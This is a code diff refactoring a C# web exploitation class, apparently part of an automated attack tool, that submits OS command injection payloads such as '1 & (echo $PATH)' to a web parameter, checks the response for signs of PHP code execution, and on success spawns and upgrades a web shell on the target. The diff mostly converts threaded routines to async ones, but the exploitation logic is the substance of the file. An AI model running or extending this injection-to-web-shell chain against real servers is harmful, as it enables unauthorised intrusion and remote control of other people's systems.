@@ -17,7 +17,7 @@ namespace Service
         private readonly Utils.WebMethod _method;
         private string _param;
         private readonly Dictionary<string, string> _postParams;
-        public WebShell shell;
+        public WebShell Shell = null;
 
         public InputWebService(string vhost, string ip, int port, string url, Utils.WebMethod method, string param,
             Dictionary<string, string> postParameters = null) : base(vhost, ip, port)
@@ -65,7 +65,8 @@ namespace Service
                 case (Utils.WebMethod.GET):
                     string s = $"{HttpUtility.UrlEncode(_param)}={HttpUtility.UrlEncode(value)}";
                     string separator = _url.Contains("?") ? "&" : "?";
-                    return await Get(_url + separator + s);
+                    string result = await Get(_url + separator + s);
+                    return result;
 
                 case (Utils.WebMethod.POST):
                     Dictionary<string, string> toSend = new Dictionary<string, string>();
@@ -82,13 +83,11 @@ namespace Service
             }
         }
 
-        public void Exploit()
+        public async Task Exploit()
         {
-            //Thread sqlInjection = SQLInjection();
-            Thread commandInjection = CommandInjection();
-            
-            //sqlInjection.Join();
-            commandInjection.Join();
+            Debug.Log($"{GetIP()}:{GetPort()}: Start of web exploitation");
+            await AsyncCommandInjection();
+            Debug.Log($"{GetIP()}:{GetPort()}: End of web exploitation");
         }
         
         public Thread SQLInjection()
@@ -97,13 +96,7 @@ namespace Service
             thread.Start();
             return thread;
         }
-
-        public Thread CommandInjection()
-        {
-            Thread thread = new Thread(ThreadedCommandInjection);
-            thread.Start();
-            return thread;
-        }
+        
 
         public void ThreadedSQLInjection()
         {
@@ -117,10 +110,9 @@ namespace Service
             command.Exec();
         }
 
-        public async void ThreadedCommandInjection()
+        public async Task AsyncCommandInjection()
         {
-            Debug.Log("Starting Command injection path");
-            
+           
             // Try for OS command injection
             string payload = "1 & (echo $PATH)";
             string result = await Submit(payload);
@@ -148,10 +140,10 @@ namespace Service
             //Debug.Log("PHP ?");
             result = await Submit(payload);
             //Debug.Log(result);
-            string EscapedParenthesis = Regex.Escape("(");
+            string escapedParenthesis = Regex.Escape("(");
             Regex PHPRegex = new Regex(
-                $"(?<!var_dump" + EscapedParenthesis + "\")"
-                + "(?<!var_dump" + EscapedParenthesis + ")"
+                $"(?<!var_dump" + escapedParenthesis + "\")"
+                + "(?<!var_dump" + escapedParenthesis + ")"
                 + "SECUStudio"
                 );
             if (PHPRegex.IsMatch(result))
@@ -164,7 +156,7 @@ namespace Service
             {
                 WebShell shell = new WebShell(this, shellType, false);
                 shell.Upgrade();
-                this.shell = shell;
+                Shell = shell;
             }
             else
             {
